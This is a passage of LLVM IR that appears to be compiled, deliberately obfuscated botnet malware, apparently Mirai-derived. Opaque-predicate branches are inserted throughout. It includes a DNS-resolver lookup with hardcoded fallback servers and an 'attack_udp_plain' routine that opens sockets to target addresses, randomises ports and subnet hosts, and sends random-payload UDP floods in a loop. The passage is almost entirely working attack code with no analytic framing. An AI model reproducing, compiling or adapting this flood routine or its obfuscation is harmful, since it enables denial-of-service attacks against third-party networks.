  %756 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %755, i32 0, i32 0
  store i16 %754, i16* %756, align 2
  br label %originalBB128

originalBB144alteredBB:                           ; preds = %originalBB144, %604
  br label %originalBB144

originalBB148alteredBB:                           ; preds = %originalBB148, %621
  br label %originalBB148

originalBB152alteredBB:                           ; preds = %originalBB152, %638
  br label %originalBB152
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  store i32 0, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 37)
  %11 = call i8* @table_retrieve_val(i32 37, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 37)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %175

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* @x.35
  %17 = load i32, i32* @y.36
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %24 = load i32, i32* %2, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %26 = call i64 @read(i32 %24, i8* %25, i64 2048)
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %3, align 4
  %28 = load i32, i32* %2, align 4
  %29 = call i32 @close(i32 %28)
  call void @table_unlock_val(i8 zeroext 38)
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %31 = load i32, i32* %3, align 4
  %32 = call i8* @table_retrieve_val(i32 38, i32* null)
  %33 = call i32 @util_stristr(i8* %30, i32 %31, i8* %32)
  store i32 %33, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 38)
  %34 = load i32, i32* %4, align 4
  %35 = icmp ne i32 %34, -1
  %36 = load i32, i32* @x.35
  %37 = load i32, i32* @y.36
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %35, label %44, label %158

; <label>:44:                                     ; preds = %originalBBpart2
  %45 = load i32, i32* @x.35
  %46 = load i32, i32* @y.36
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %44
  store i32 0, i32* %6, align 4
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %53 = load i32, i32* %4, align 4
  store i32 %53, i32* %6, align 4
  %54 = load i32, i32* @x.35
  %55 = load i32, i32* @y.36
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %62

; <label>:62:                                     ; preds = %148, %originalBBpart24
  %63 = load i32, i32* @x.35
  %64 = load i32, i32* @y.36
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  %71 = load i32, i32* %6, align 4
  %72 = load i32, i32* %3, align 4
  %73 = icmp slt i32 %71, %72
  %74 = load i32, i32* @x.35
  %75 = load i32, i32* @y.36
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %73, label %82, label %151

; <label>:82:                                     ; preds = %originalBBpart28
  %83 = load i32, i32* @x.35
  %84 = load i32, i32* @y.36
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %82
  %91 = load i32, i32* %6, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %92
  %94 = load i8, i8* %93, align 1
  store i8 %94, i8* %10, align 1
  %95 = load i8, i8* %8, align 1
  %96 = icmp ne i8 %95, 0
  %97 = load i32, i32* @x.35
  %98 = load i32, i32* @y.36
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %96, label %116, label %105

; <label>:105:                                    ; preds = %originalBBpart212
  %106 = load i8, i8* %10, align 1
  %107 = sext i8 %106 to i32
  %108 = icmp eq i32 %107, 32
  br i1 %108, label %113, label %109

; <label>:109:                                    ; preds = %105
  %110 = load i8, i8* %10, align 1
  %111 = sext i8 %110 to i32
  %112 = icmp eq i32 %111, 9
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %109, %105
  br label %148

; <label>:114:                                    ; preds = %109
  store i8 1, i8* %8, align 1
  br label %115

; <label>:115:                                    ; preds = %114
  br label %116

; <label>:116:                                    ; preds = %115, %originalBBpart212
  %117 = load i8, i8* %10, align 1
  %118 = sext i8 %117 to i32
  %119 = icmp ne i32 %118, 46
  br i1 %119, label %120, label %128

; <label>:120:                                    ; preds = %116
  %121 = load i8, i8* %10, align 1
  %122 = sext i8 %121 to i32
  %123 = icmp slt i32 %122, 48
  br i1 %123, label %133, label %124

; <label>:124:                                    ; preds = %120
  %125 = load i8, i8* %10, align 1
  %126 = sext i8 %125 to i32
  %127 = icmp sgt i32 %126, 57
  br i1 %127, label %133, label %128

; <label>:128:                                    ; preds = %124, %116
  %129 = load i32, i32* %6, align 4
  %130 = load i32, i32* %3, align 4
  %131 = sub nsw i32 %130, 1
  %132 = icmp eq i32 %129, %131
  br i1 %132, label %133, label %147

; <label>:133:                                    ; preds = %128, %124, %120
  %134 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %135 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %136 = load i32, i32* %4, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8, i8* %135, i64 %137
  %139 = load i32, i32* %6, align 4
  %140 = load i32, i32* %4, align 4
  %141 = sub nsw i32 %139, %140
  call void @util_memcpy(i8* %134, i8* %138, i32 %141)
  %142 = load i32, i32* %6, align 4
  %143 = load i32, i32* %4, align 4
  %144 = sub nsw i32 %142, %143
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %145
  store i8 0, i8* %146, align 1
  store i8 1, i8* %9, align 1
  br label %151

; <label>:147:                                    ; preds = %128
  br label %148

; <label>:148:                                    ; preds = %147, %113
  %149 = load i32, i32* %6, align 4
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* %6, align 4
  br label %62

; <label>:151:                                    ; preds = %133, %originalBBpart28
  %152 = load i8, i8* %9, align 1
  %153 = icmp ne i8 %152, 0
  br i1 %153, label %154, label %157

; <label>:154:                                    ; preds = %151
  %155 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %156 = call i32 @inet_addr(i8* %155) #6
  store i32 %156, i32* %1, align 4
  br label %186

; <label>:157:                                    ; preds = %151
  br label %158

; <label>:158:                                    ; preds = %157, %originalBBpart2
  %159 = load i32, i32* @x.35
  %160 = load i32, i32* @y.36
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %158
  %167 = load i32, i32* @x.35
  %168 = load i32, i32* @y.36
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %175

; <label>:175:                                    ; preds = %originalBBpart216, %0
  %176 = call i32 @rand_next()
  %177 = urem i32 %176, 4
  switch i32 %177, label %186 [
    i32 0, label %178
    i32 1, label %180
    i32 2, label %182
    i32 3, label %184
  ]

; <label>:178:                                    ; preds = %175
  %179 = call i32 @htonl(i32 134744072) #7
  store i32 %179, i32* %1, align 4
  br label %186

; <label>:180:                                    ; preds = %175
  %181 = call i32 @htonl(i32 1246898730) #7
  store i32 %181, i32* %1, align 4
  br label %186

; <label>:182:                                    ; preds = %175
  %183 = call i32 @htonl(i32 1074151430) #7
  store i32 %183, i32* %1, align 4
  br label %186

; <label>:184:                                    ; preds = %175
  %185 = call i32 @htonl(i32 67240450) #7
  store i32 %185, i32* %1, align 4
  br label %186

; <label>:186:                                    ; preds = %184, %182, %180, %178, %175, %154
  %187 = load i32, i32* %1, align 4
  ret i32 %187

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %188 = load i32, i32* %2, align 4
  %189 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %190 = call i64 @read(i32 %188, i8* %189, i64 2048)
  %191 = trunc i64 %190 to i32
  store i32 %191, i32* %3, align 4
  %192 = load i32, i32* %2, align 4
  %193 = call i32 @close(i32 %192)
  call void @table_unlock_val(i8 zeroext 38)
  %194 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %195 = load i32, i32* %3, align 4
  %196 = call i8* @table_retrieve_val(i32 38, i32* null)
  %197 = call i32 @util_stristr(i8* %194, i32 %195, i8* %196)
  store i32 %197, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 38)
  %198 = load i32, i32* %4, align 4
  %199 = icmp ne i32 %198, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %44
  store i32 0, i32* %6, align 4
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %200 = load i32, i32* %4, align 4
  store i32 %200, i32* %6, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  %201 = load i32, i32* %6, align 4
  %202 = load i32, i32* %3, align 4
  %203 = icmp slt i32 %201, %202
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %82
  %204 = load i32, i32* %6, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %205
  %207 = load i8, i8* %206, align 1
  store i8 %207, i8* %10, align 1
  %208 = load i8, i8* %8, align 1
  %209 = icmp ne i8 %208, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %158
  br label %originalBB14
}

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = load i32, i32* @x.37
  %7 = load i32, i32* @y.38
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_target*, align 8
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_option*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i8**, align 8
  %21 = alloca i32*, align 8
  %22 = alloca i16, align 2
  %23 = alloca i16, align 2
  %24 = alloca i16, align 2
  %25 = alloca i8, align 1
  %26 = alloca %struct.sockaddr_in, align 4
  %27 = alloca i32, align 4
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i8*, align 8
  store i32 %0, i32* %14, align 4
  store i8 %1, i8* %15, align 1
  store %struct.attack_target* %2, %struct.attack_target** %16, align 8
  store i8 %3, i8* %17, align 1
  store %struct.attack_option* %4, %struct.attack_option** %18, align 8
  store i32 0, i32* %19, align 4
  %34 = load i8, i8* %15, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %20, align 8
  %38 = load i8, i8* %15, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 4) #6
  %41 = bitcast i8* %40 to i32*
  store i32* %41, i32** %21, align 8
  %42 = load i8, i8* %17, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 7, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %22, align 2
  %46 = load i8, i8* %17, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 6, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %23, align 2
  %50 = load i8, i8* %17, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 0, i32 512)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %24, align 2
  %54 = load i8, i8* %17, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 1, i32 1)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %25, align 1
  %58 = bitcast %struct.sockaddr_in* %26 to i8*
  call void @llvm.memset.p0i8.i64(i8* %58, i8 0, i64 16, i32 4, i1 false)
  %59 = call i64 @time(i64* null) #6
  %60 = load i32, i32* %14, align 4
  %61 = sext i32 %60 to i64
  %62 = add nsw i64 %59, %61
  %63 = trunc i64 %62 to i32
  store i32 %63, i32* %27, align 4
  %64 = load i16, i16* %23, align 2
  %65 = zext i16 %64 to i32
  %66 = icmp eq i32 %65, 65535
  %67 = load i32, i32* @x.37
  %68 = load i32, i32* @y.38
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %66, label %75, label %78

; <label>:75:                                     ; preds = %originalBBpart2
  %76 = call i32 @rand_next()
  %77 = trunc i32 %76 to i16
  store i16 %77, i16* %23, align 2
  br label %97

; <label>:78:                                     ; preds = %originalBBpart2
  %79 = load i32, i32* @x.37
  %80 = load i32, i32* @y.38
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %78
  %87 = load i16, i16* %23, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %87) #7
  store i16 %88, i16* %23, align 2
  %89 = load i32, i32* @x.37
  %90 = load i32, i32* @y.38
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br label %97

; <label>:97:                                     ; preds = %originalBBpart29, %75
  store i32 0, i32* %19, align 4
  br label %98

; <label>:98:                                     ; preds = %258, %97
  %99 = load i32, i32* %19, align 4
  %100 = load i8, i8* %15, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp slt i32 %99, %101
  br i1 %102, label %103, label %261

; <label>:103:                                    ; preds = %98
  %104 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %105 = load i8**, i8*** %20, align 8
  %106 = load i32, i32* %19, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8*, i8** %105, i64 %107
  store i8* %104, i8** %108, align 8
  %109 = load i16, i16* %22, align 2
  %110 = zext i16 %109 to i32
  %111 = icmp eq i32 %110, 65535
  br i1 %111, label %112, label %121

; <label>:112:                                    ; preds = %103
  %113 = call i32 @rand_next()
  %114 = trunc i32 %113 to i16
  %115 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %116 = load i32, i32* %19, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %115, i64 %117
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %118, i32 0, i32 0
  %120 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %119, i32 0, i32 1
  store i16 %114, i16* %120, align 2
  br label %130

; <label>:121:                                    ; preds = %103
  %122 = load i16, i16* %22, align 2
  %123 = call zeroext i16 @htons(i16 zeroext %122) #7
  %124 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %125 = load i32, i32* %19, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %124, i64 %126
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i32 0, i32 0
  %129 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %128, i32 0, i32 1
  store i16 %123, i16* %129, align 2
  br label %130

; <label>:130:                                    ; preds = %121, %112
  %131 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %132 = load i32*, i32** %21, align 8
  %133 = load i32, i32* %19, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i32, i32* %132, i64 %134
  store i32 %131, i32* %135, align 4
  %136 = icmp eq i32 %131, -1
  br i1 %136, label %137, label %154

; <label>:137:                                    ; preds = %130
  %138 = load i32, i32* @x.37
  %139 = load i32, i32* @y.38
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %137
  %146 = load i32, i32* @x.37
  %147 = load i32, i32* @y.38
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br label %352

; <label>:154:                                    ; preds = %130
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 0
  store i16 2, i16* %155, align 4
  %156 = load i16, i16* %23, align 2
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 1
  store i16 %156, i16* %157, align 2
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 2
  %159 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %158, i32 0, i32 0
  store i32 0, i32* %159, align 4
  %160 = load i32*, i32** %21, align 8
  %161 = load i32, i32* %19, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i32, i32* %160, i64 %162
  %164 = load i32, i32* %163, align 4
  %165 = bitcast %union.__CONST_SOCKADDR_ARG* %31 to %struct.sockaddr**
  %166 = bitcast %struct.sockaddr_in* %26 to %struct.sockaddr*
  store %struct.sockaddr* %166, %struct.sockaddr** %165, align 8
  %167 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %31, i32 0, i32 0
  %168 = load %struct.sockaddr*, %struct.sockaddr** %167, align 8
  %169 = call i32 @bind(i32 %164, %struct.sockaddr* %168, i32 16) #6
  %170 = icmp eq i32 %169, -1
  br i1 %170, label %171, label %188

; <label>:171:                                    ; preds = %154
  %172 = load i32, i32* @x.37
  %173 = load i32, i32* @y.38
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %171
  %180 = load i32, i32* @x.37
  %181 = load i32, i32* @y.38
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %188

; <label>:188:                                    ; preds = %originalBBpart217, %154
  %189 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %190 = load i32, i32* %19, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i32 0, i32 2
  %194 = load i8, i8* %193, align 4
  %195 = zext i8 %194 to i32
  %196 = icmp slt i32 %195, 32
  br i1 %196, label %197, label %223

; <label>:197:                                    ; preds = %188
  %198 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %199 = load i32, i32* %19, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = call i32 @ntohl(i32 %203) #7
  %205 = call i32 @rand_next()
  %206 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %207 = load i32, i32* %19, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i64 %208
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %209, i32 0, i32 2
  %211 = load i8, i8* %210, align 4
  %212 = zext i8 %211 to i32
  %213 = lshr i32 %205, %212
  %214 = add i32 %204, %213
  %215 = call i32 @htonl(i32 %214) #7
  %216 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %217 = load i32, i32* %19, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i64 %218
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %219, i32 0, i32 0
  %221 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %220, i32 0, i32 2
  %222 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %221, i32 0, i32 0
  store i32 %215, i32* %222, align 4
  br label %223

; <label>:223:                                    ; preds = %197, %188
  %224 = load i32, i32* @x.37
  %225 = load i32, i32* @y.38
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %223
  %232 = load i32*, i32** %21, align 8
  %233 = load i32, i32* %19, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i32, i32* %232, i64 %234
  %236 = load i32, i32* %235, align 4
  %237 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %238 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %239 = load i32, i32* %19, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %238, i64 %240
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %241, i32 0, i32 0
  %243 = bitcast %struct.sockaddr_in* %242 to %struct.sockaddr*
  store %struct.sockaddr* %243, %struct.sockaddr** %237, align 8
  %244 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %245 = load %struct.sockaddr*, %struct.sockaddr** %244, align 8
  %246 = call i32 @connect(i32 %236, %struct.sockaddr* %245, i32 16)
  %247 = icmp eq i32 %246, -1
  %248 = load i32, i32* @x.37
  %249 = load i32, i32* @y.38
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %247, label %256, label %257

; <label>:256:                                    ; preds = %originalBBpart221
  br label %257

; <label>:257:                                    ; preds = %256, %originalBBpart221
  br label %258

; <label>:258:                                    ; preds = %257
  %259 = load i32, i32* %19, align 4
  %260 = add nsw i32 %259, 1
  store i32 %260, i32* %19, align 4
  br label %98

; <label>:261:                                    ; preds = %98
  %262 = load i32, i32* @x.37
  %263 = load i32, i32* @y.38
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %261
  %270 = load i32, i32* @x.37
  %271 = load i32, i32* @y.38
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %278

; <label>:278:                                    ; preds = %351, %originalBBpart225
  store i32 0, i32* %19, align 4
  br label %279

; <label>:279:                                    ; preds = %originalBBpart242, %278
  %280 = load i32, i32* %19, align 4
  %281 = load i8, i8* %15, align 1
  %282 = zext i8 %281 to i32
  %283 = icmp slt i32 %280, %282
  br i1 %283, label %284, label %345

; <label>:284:                                    ; preds = %279
  %285 = load i8**, i8*** %20, align 8
  %286 = load i32, i32* %19, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds i8*, i8** %285, i64 %287
  %289 = load i8*, i8** %288, align 8
  store i8* %289, i8** %33, align 8
  %290 = load i8, i8* %25, align 1
  %291 = icmp ne i8 %290, 0
  br i1 %291, label %292, label %300

; <label>:292:                                    ; preds = %284
  %293 = load i8*, i8** %33, align 8
  %294 = load i16, i16* %24, align 2
  %295 = zext i16 %294 to i32
  call void @rand_alphastr(i8* %293, i32 %295)
  %296 = load i8*, i8** %33, align 8
  %297 = load i16, i16* %24, align 2
  %298 = zext i16 %297 to i64
  %299 = getelementptr inbounds i8, i8* %296, i64 %298
  store i8 0, i8* %299, align 1
  br label %300

; <label>:300:                                    ; preds = %292, %284
  %301 = load i32, i32* @x.37
  %302 = load i32, i32* @y.38
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %300
  %309 = load i32*, i32** %21, align 8
  %310 = load i32, i32* %19, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds i32, i32* %309, i64 %311
  %313 = load i32, i32* %312, align 4
  %314 = load i8*, i8** %33, align 8
  %315 = load i16, i16* %24, align 2
  %316 = zext i16 %315 to i64
  %317 = call i64 @send(i32 %313, i8* %314, i64 %316, i32 16384)
  %318 = load i32, i32* @x.37
  %319 = load i32, i32* @y.38
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
